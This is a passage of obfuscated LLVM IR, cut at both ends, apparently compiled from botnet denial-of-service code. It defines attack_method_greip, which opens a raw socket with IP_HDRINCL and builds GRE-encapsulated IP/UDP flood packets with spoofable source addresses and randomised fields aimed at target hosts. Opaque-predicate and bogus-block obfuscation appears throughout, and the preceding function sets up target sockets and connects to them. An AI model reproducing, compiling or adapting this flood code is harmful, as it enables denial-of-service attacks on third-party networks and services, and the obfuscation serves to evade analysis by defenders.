  %_9 = shl i32 %391, 256
  %_10 = shl i32 %391, 256
  %_11 = sub i32 0, %391
  %gen12 = add i32 %_11, 256
  %392 = srem i32 %391, 256
  %393 = sext i32 %392 to i64
  %394 = getelementptr inbounds [256 x i8*], [256 x i8*]* %27, i64 0, i64 %393
  %395 = load i8*, i8** %394, align 8
  store i8* %395, i8** %28, align 8
  %396 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %397 = load i8**, i8*** %18, align 8
  %398 = load i32, i32* %17, align 4
  %399 = sext i32 %398 to i64
  %400 = getelementptr inbounds i8*, i8** %397, i64 %399
  store i8* %396, i8** %400, align 8
  %401 = load i16, i16* %20, align 2
  %402 = zext i16 %401 to i32
  %403 = icmp eq i32 %402, 65535
  br label %originalBB6

originalBB16alteredBB:                            ; preds = %originalBB16, %136
  %404 = load i16, i16* %20, align 2
  %405 = call zeroext i16 @htons(i16 zeroext %404) #7
  %406 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %407 = load i32, i32* %17, align 4
  %408 = sext i32 %407 to i64
  %409 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %406, i64 %408
  %410 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %409, i32 0, i32 0
  %411 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %410, i32 0, i32 1
  store i16 %405, i16* %411, align 2
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %196
  %412 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %413 = load i32, i32* %17, align 4
  %414 = sext i32 %413 to i64
  %415 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %412, i64 %414
  %416 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %415, i32 0, i32 1
  %417 = load i32, i32* %416, align 4
  %418 = call i32 @ntohl(i32 %417) #7
  %419 = call i32 @rand_next()
  %420 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %421 = load i32, i32* %17, align 4
  %422 = sext i32 %421 to i64
  %423 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %420, i64 %422
  %424 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %423, i32 0, i32 2
  %425 = load i8, i8* %424, align 4
  %426 = zext i8 %425 to i32
  %_21 = shl i32 %419, %426
  %427 = lshr i32 %419, %426
  %_22 = sub i32 0, %418
  %gen23 = add i32 %_22, %427
  %_24 = sub i32 %418, %427
  %gen25 = mul i32 %_24, %427
  %_26 = sub i32 0, %418
  %gen27 = add i32 %_26, %427
  %_28 = sub i32 0, %418
  %gen29 = add i32 %_28, %427
  %_30 = sub i32 0, %418
  %gen31 = add i32 %_30, %427
  %_32 = sub i32 %418, %427
  %gen33 = mul i32 %_32, %427
  %_34 = sub i32 %418, %427
  %gen35 = mul i32 %_34, %427
  %_36 = sub i32 %418, %427
  %gen37 = mul i32 %_36, %427
  %_38 = shl i32 %418, %427
  %428 = add i32 %418, %427
  %429 = call i32 @htonl(i32 %428) #7
  %430 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %431 = load i32, i32* %17, align 4
  %432 = sext i32 %431 to i64
  %433 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %430, i64 %432
  %434 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %433, i32 0, i32 0
  %435 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %434, i32 0, i32 2
  %436 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %435, i32 0, i32 0
  store i32 %429, i32* %436, align 4
  br label %originalBB20

originalBB42alteredBB:                            ; preds = %originalBB42, %238
  %437 = load i32*, i32** %19, align 8
  %438 = load i32, i32* %17, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds i32, i32* %437, i64 %439
  %441 = load i32, i32* %440, align 4
  %442 = bitcast %union.__CONST_SOCKADDR_ARG* %30 to %struct.sockaddr**
  %443 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %444 = load i32, i32* %17, align 4
  %445 = sext i32 %444 to i64
  %446 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %443, i64 %445
  %447 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %446, i32 0, i32 0
  %448 = bitcast %struct.sockaddr_in* %447 to %struct.sockaddr*
  store %struct.sockaddr* %448, %struct.sockaddr** %442, align 8
  %449 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %30, i32 0, i32 0
  %450 = load %struct.sockaddr*, %struct.sockaddr** %449, align 8
  %451 = call i32 @connect(i32 %441, %struct.sockaddr* %450, i32 16)
  %452 = icmp eq i32 %451, -1
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %273
  %453 = load i32, i32* %17, align 4
  %_47 = sub i32 0, %453
  %gen48 = add i32 %_47, 1
  %454 = add nsw i32 %453, 1
  store i32 %454, i32* %17, align 4
  br label %originalBB46

originalBB52alteredBB:                            ; preds = %originalBB52, %324
  br label %originalBB52
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: nounwind
declare i32 @rand() #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.grehdr*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %33 = load i8, i8* %5, align 1
  %34 = zext i8 %33 to i64
  %35 = call noalias i8* @calloc(i64 %34, i64 8) #6
  %36 = bitcast i8* %35 to i8**
  store i8** %36, i8*** %11, align 8
  %37 = load i8, i8* %7, align 1
  %38 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %39 = call i32 @attack_get_opt_int(i8 zeroext %37, %struct.attack_option* %38, i8 zeroext 2, i32 0)
  %40 = trunc i32 %39 to i8
  store i8 %40, i8* %12, align 1
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 3, i32 65535)
  %44 = trunc i32 %43 to i16
  store i16 %44, i16* %13, align 2
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 4, i32 64)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 5, i32 1)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %15, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 6, i32 65535)
  %56 = trunc i32 %55 to i16
  store i16 %56, i16* %16, align 2
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 7, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %17, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 0, i32 1458)
  store i32 %63, i32* %18, align 4
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 1, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %19, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 19, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = load i32, i32* @LOCAL_ADDR, align 4
  %75 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 25, i32 %74)
  store i32 %75, i32* %21, align 4
  %76 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %76, i32* %10, align 4
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %78, label %95

; <label>:78:                                     ; preds = %4
  %79 = load i32, i32* @x.25
  %80 = load i32, i32* @y.26
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %78
  %87 = load i32, i32* @x.25
  %88 = load i32, i32* @y.26
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %625

; <label>:95:                                     ; preds = %4
  %96 = load i32, i32* @x.25
  %97 = load i32, i32* @y.26
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %95
  store i32 1, i32* %9, align 4
  %104 = load i32, i32* %10, align 4
  %105 = bitcast i32* %9 to i8*
  %106 = call i32 @setsockopt(i32 %104, i32 0, i32 3, i8* %105, i32 4) #6
  %107 = icmp eq i32 %106, -1
  %108 = load i32, i32* @x.25
  %109 = load i32, i32* @y.26
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %107, label %116, label %119

; <label>:116:                                    ; preds = %originalBBpart24
  %117 = load i32, i32* %10, align 4
  %118 = call i32 @close(i32 %117)
  br label %625

; <label>:119:                                    ; preds = %originalBBpart24
  store i32 0, i32* %9, align 4
  br label %120

; <label>:120:                                    ; preds = %286, %119
  %121 = load i32, i32* %9, align 4
  %122 = load i8, i8* %5, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %121, %123
  br i1 %124, label %125, label %289

; <label>:125:                                    ; preds = %120
  %126 = call noalias i8* @calloc(i64 1458, i64 8) #6
  %127 = load i8**, i8*** %11, align 8
  %128 = load i32, i32* %9, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i8*, i8** %127, i64 %129
  store i8* %126, i8** %130, align 8
  %131 = load i8**, i8*** %11, align 8
  %132 = load i32, i32* %9, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds i8*, i8** %131, i64 %133
  %135 = load i8*, i8** %134, align 8
  %136 = bitcast i8* %135 to %struct.iphdr*
  store %struct.iphdr* %136, %struct.iphdr** %22, align 8
  %137 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %138 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %137, i64 1
  %139 = bitcast %struct.iphdr* %138 to %struct.grehdr*
  store %struct.grehdr* %139, %struct.grehdr** %23, align 8
  %140 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %141 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %140, i64 1
  %142 = bitcast %struct.grehdr* %141 to %struct.iphdr*
  store %struct.iphdr* %142, %struct.iphdr** %24, align 8
  %143 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %144 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %143, i64 1
  %145 = bitcast %struct.iphdr* %144 to %struct.udphdr*
  store %struct.udphdr* %145, %struct.udphdr** %25, align 8
  %146 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %147 = bitcast %struct.iphdr* %146 to i8*
  %148 = load i8, i8* %147, align 4
  %149 = and i8 %148, 15
  %150 = or i8 %149, 64
  store i8 %150, i8* %147, align 4
  %151 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %152 = bitcast %struct.iphdr* %151 to i8*
  %153 = load i8, i8* %152, align 4
  %154 = and i8 %153, -16
  %155 = or i8 %154, 5
  store i8 %155, i8* %152, align 4
  %156 = load i8, i8* %12, align 1
  %157 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %158 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %157, i32 0, i32 1
  store i8 %156, i8* %158, align 1
  %159 = load i32, i32* %18, align 4
  %160 = sext i32 %159 to i64
  %161 = add i64 52, %160
  %162 = trunc i64 %161 to i16
  %163 = call zeroext i16 @htons(i16 zeroext %162) #7
  %164 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i32 0, i32 2
  store i16 %163, i16* %165, align 2
  %166 = load i16, i16* %13, align 2
  %167 = call zeroext i16 @htons(i16 zeroext %166) #7
  %168 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 3
  store i16 %167, i16* %169, align 4
  %170 = load i8, i8* %14, align 1
  %171 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 5
  store i8 %170, i8* %172, align 4
  %173 = load i8, i8* %15, align 1
  %174 = icmp ne i8 %173, 0
  br i1 %174, label %175, label %195

; <label>:175:                                    ; preds = %125
  %176 = load i32, i32* @x.25
  %177 = load i32, i32* @y.26
  %178 = sub i32 %176, 1
  %179 = mul i32 %176, %178
  %180 = urem i32 %179, 2
  %181 = icmp eq i32 %180, 0
  %182 = icmp slt i32 %177, 10
  %183 = or i1 %181, %182
  br i1 %183, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %175
  %184 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %185 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i32 0, i32 4
  store i16 %184, i16* %186, align 2
  %187 = load i32, i32* @x.25
  %188 = load i32, i32* @y.26
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %195

; <label>:195:                                    ; preds = %originalBBpart28, %125
  %196 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 6
  store i8 47, i8* %197, align 1
  %198 = load i32, i32* %21, align 4
  %199 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i32 0, i32 8
  store i32 %198, i32* %200, align 4
  %201 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %202 = load i32, i32* %9, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %201, i64 %203
  %205 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %204, i32 0, i32 1
  %206 = load i32, i32* %205, align 4
  %207 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 9
  store i32 %206, i32* %208, align 4
  %209 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %210 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %211 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %210, i32 0, i32 1
  store i16 %209, i16* %211, align 2
  %212 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %213 = bitcast %struct.iphdr* %212 to i8*
  %214 = load i8, i8* %213, align 4
  %215 = and i8 %214, 15
  %216 = or i8 %215, 64
  store i8 %216, i8* %213, align 4
  %217 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %218 = bitcast %struct.iphdr* %217 to i8*
  %219 = load i8, i8* %218, align 4
  %220 = and i8 %219, -16
  %221 = or i8 %220, 5
  store i8 %221, i8* %218, align 4
  %222 = load i8, i8* %12, align 1
  %223 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 1
  store i8 %222, i8* %224, align 1
  %225 = load i32, i32* %18, align 4
  %226 = sext i32 %225 to i64
  %227 = add i64 28, %226
  %228 = trunc i64 %227 to i16
  %229 = call zeroext i16 @htons(i16 zeroext %228) #7
  %230 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %231 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %230, i32 0, i32 2
  store i16 %229, i16* %231, align 2
  %232 = load i16, i16* %13, align 2
  %233 = zext i16 %232 to i32
  %234 = xor i32 %233, -1
  %235 = trunc i32 %234 to i16
  %236 = call zeroext i16 @htons(i16 zeroext %235) #7
  %237 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %238 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %237, i32 0, i32 3
  store i16 %236, i16* %238, align 4
  %239 = load i8, i8* %14, align 1
  %240 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %241 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %240, i32 0, i32 5
  store i8 %239, i8* %241, align 4
  %242 = load i8, i8* %15, align 1
  %243 = icmp ne i8 %242, 0
  br i1 %243, label %244, label %248

; <label>:244:                                    ; preds = %195
  %245 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %246 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %247 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %246, i32 0, i32 4
  store i16 %245, i16* %247, align 2
  br label %248

; <label>:248:                                    ; preds = %244, %195
  %249 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %250 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %249, i32 0, i32 6
  store i8 17, i8* %250, align 1
  %251 = call i32 @rand_next()
  %252 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %253 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %252, i32 0, i32 8
  store i32 %251, i32* %253, align 4
  %254 = load i8, i8* %20, align 1
  %255 = icmp ne i8 %254, 0
  br i1 %255, label %256, label %262

; <label>:256:                                    ; preds = %248
  %257 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %258 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %257, i32 0, i32 9
  %259 = load i32, i32* %258, align 4
  %260 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %261 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %260, i32 0, i32 9
  store i32 %259, i32* %261, align 4
  br label %270

; <label>:262:                                    ; preds = %248
  %263 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %264 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %263, i32 0, i32 8
  %265 = load i32, i32* %264, align 4
  %266 = sub i32 %265, 1024
  %267 = xor i32 %266, -1
  %268 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %269 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %268, i32 0, i32 9
  store i32 %267, i32* %269, align 4
  br label %270

; <label>:270:                                    ; preds = %262, %256
  %271 = load i16, i16* %16, align 2
  %272 = call zeroext i16 @htons(i16 zeroext %271) #7
  %273 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %274 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %273, i32 0, i32 0
  store i16 %272, i16* %274, align 2
  %275 = load i16, i16* %17, align 2
  %276 = call zeroext i16 @htons(i16 zeroext %275) #7
  %277 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %278 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %277, i32 0, i32 1
  store i16 %276, i16* %278, align 2
  %279 = load i32, i32* %18, align 4
  %280 = sext i32 %279 to i64
  %281 = add i64 8, %280
  %282 = trunc i64 %281 to i16
  %283 = call zeroext i16 @htons(i16 zeroext %282) #7
  %284 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %285 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %284, i32 0, i32 2
  store i16 %283, i16* %285, align 2
  br label %286

; <label>:286:                                    ; preds = %270
  %287 = load i32, i32* %9, align 4
  %288 = add nsw i32 %287, 1
  store i32 %288, i32* %9, align 4
  br label %120

; <label>:289:                                    ; preds = %120
  %290 = load i32, i32* @x.25
  %291 = load i32, i32* @y.26
  %292 = sub i32 %290, 1
  %293 = mul i32 %290, %292
  %294 = urem i32 %293, 2
  %295 = icmp eq i32 %294, 0
  %296 = icmp slt i32 %291, 10
  %297 = or i1 %295, %296
  br i1 %297, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %289
  %298 = load i32, i32* @x.25
  %299 = load i32, i32* @y.26
  %300 = sub i32 %298, 1
  %301 = mul i32 %298, %300
  %302 = urem i32 %301, 2
  %303 = icmp eq i32 %302, 0
  %304 = icmp slt i32 %299, 10
  %305 = or i1 %303, %304
  br i1 %305, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %306

; <label>:306:                                    ; preds = %originalBBpart261, %originalBBpart212
  %307 = load i32, i32* @x.25
  %308 = load i32, i32* @y.26
  %309 = sub i32 %307, 1
  %310 = mul i32 %307, %309
  %311 = urem i32 %310, 2
  %312 = icmp eq i32 %311, 0
  %313 = icmp slt i32 %308, 10
  %314 = or i1 %312, %313
  br i1 %314, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %306
  store i32 0, i32* %9, align 4
  %315 = load i32, i32* @x.25
  %316 = load i32, i32* @y.26
  %317 = sub i32 %315, 1
  %318 = mul i32 %315, %317
  %319 = urem i32 %318, 2
  %320 = icmp eq i32 %319, 0
  %321 = icmp slt i32 %316, 10
  %322 = or i1 %320, %321
  br i1 %322, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %323

; <label>:323:                                    ; preds = %605, %originalBBpart216
  %324 = load i32, i32* @x.25
  %325 = load i32, i32* @y.26
  %326 = sub i32 %324, 1
  %327 = mul i32 %324, %326
  %328 = urem i32 %327, 2
  %329 = icmp eq i32 %328, 0
  %330 = icmp slt i32 %325, 10
  %331 = or i1 %329, %330
  br i1 %331, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %323
  %332 = load i32, i32* %9, align 4
  %333 = load i8, i8* %5, align 1
  %334 = zext i8 %333 to i32
  %335 = icmp slt i32 %332, %334
  %336 = load i32, i32* @x.25
  %337 = load i32, i32* @y.26
  %338 = sub i32 %336, 1
  %339 = mul i32 %336, %338
  %340 = urem i32 %339, 2
  %341 = icmp eq i32 %340, 0
  %342 = icmp slt i32 %337, 10
  %343 = or i1 %341, %342
  br i1 %343, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %335, label %344, label %608

; <label>:344:                                    ; preds = %originalBBpart220
  %345 = load i8**, i8*** %11, align 8
  %346 = load i32, i32* %9, align 4
  %347 = sext i32 %346 to i64
  %348 = getelementptr inbounds i8*, i8** %345, i64 %347
  %349 = load i8*, i8** %348, align 8
  store i8* %349, i8** %26, align 8
  %350 = load i8*, i8** %26, align 8
  %351 = bitcast i8* %350 to %struct.iphdr*
  store %struct.iphdr* %351, %struct.iphdr** %27, align 8
  %352 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %353 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %352, i64 1
  %354 = bitcast %struct.iphdr* %353 to %struct.grehdr*
  store %struct.grehdr* %354, %struct.grehdr** %28, align 8
  %355 = load %struct.grehdr*, %struct.grehdr** %28, align 8
  %356 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %355, i64 1
  %357 = bitcast %struct.grehdr* %356 to %struct.iphdr*
  store %struct.iphdr* %357, %struct.iphdr** %29, align 8
  %358 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %359 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %358, i64 1
  %360 = bitcast %struct.iphdr* %359 to %struct.udphdr*
  store %struct.udphdr* %360, %struct.udphdr** %30, align 8
  %361 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %362 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %361, i64 1
  %363 = bitcast %struct.udphdr* %362 to i8*
  store i8* %363, i8** %31, align 8
  %364 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %365 = load i32, i32* %9, align 4
  %366 = sext i32 %365 to i64
  %367 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %364, i64 %366
  %368 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %367, i32 0, i32 2
  %369 = load i8, i8* %368, align 4
  %370 = zext i8 %369 to i32
  %371 = icmp slt i32 %370, 32
  br i1 %371, label %372, label %393

; <label>:372:                                    ; preds = %344
  %373 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %374 = load i32, i32* %9, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %373, i64 %375
  %377 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %376, i32 0, i32 1
  %378 = load i32, i32* %377, align 4
  %379 = call i32 @ntohl(i32 %378) #7
  %380 = call i32 @rand_next()
  %381 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %382 = load i32, i32* %9, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %381, i64 %383
  %385 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %384, i32 0, i32 2
  %386 = load i8, i8* %385, align 4
  %387 = zext i8 %386 to i32
  %388 = lshr i32 %380, %387
  %389 = add i32 %379, %388
  %390 = call i32 @htonl(i32 %389) #7
  %391 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %392 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %391, i32 0, i32 9
  store i32 %390, i32* %392, align 4
  br label %393

; <label>:393:                                    ; preds = %372, %344
  %394 = load i32, i32* @x.25
  %395 = load i32, i32* @y.26
  %396 = sub i32 %394, 1
  %397 = mul i32 %394, %396
  %398 = urem i32 %397, 2
  %399 = icmp eq i32 %398, 0
  %400 = icmp slt i32 %395, 10
  %401 = or i1 %399, %400
  br i1 %401, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %393
  %402 = load i32, i32* %21, align 4
  %403 = icmp eq i32 %402, -1
  %404 = load i32, i32* @x.25
  %405 = load i32, i32* @y.26
  %406 = sub i32 %404, 1
  %407 = mul i32 %404, %406
  %408 = urem i32 %407, 2
  %409 = icmp eq i32 %408, 0
  %410 = icmp slt i32 %405, 10
  %411 = or i1 %409, %410
  br i1 %411, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %403, label %412, label %416

; <label>:412:                                    ; preds = %originalBBpart224
  %413 = call i32 @rand_next()
  %414 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 8
  store i32 %413, i32* %415, align 4
  br label %416

; <label>:416:                                    ; preds = %412, %originalBBpart224
  %417 = load i16, i16* %13, align 2
  %418 = zext i16 %417 to i32
  %419 = icmp eq i32 %418, 65535
  br i1 %419, label %420, label %451

; <label>:420:                                    ; preds = %416
  %421 = load i32, i32* @x.25
  %422 = load i32, i32* @y.26
  %423 = sub i32 %421, 1
  %424 = mul i32 %421, %423
  %425 = urem i32 %424, 2
  %426 = icmp eq i32 %425, 0
  %427 = icmp slt i32 %422, 10
  %428 = or i1 %426, %427
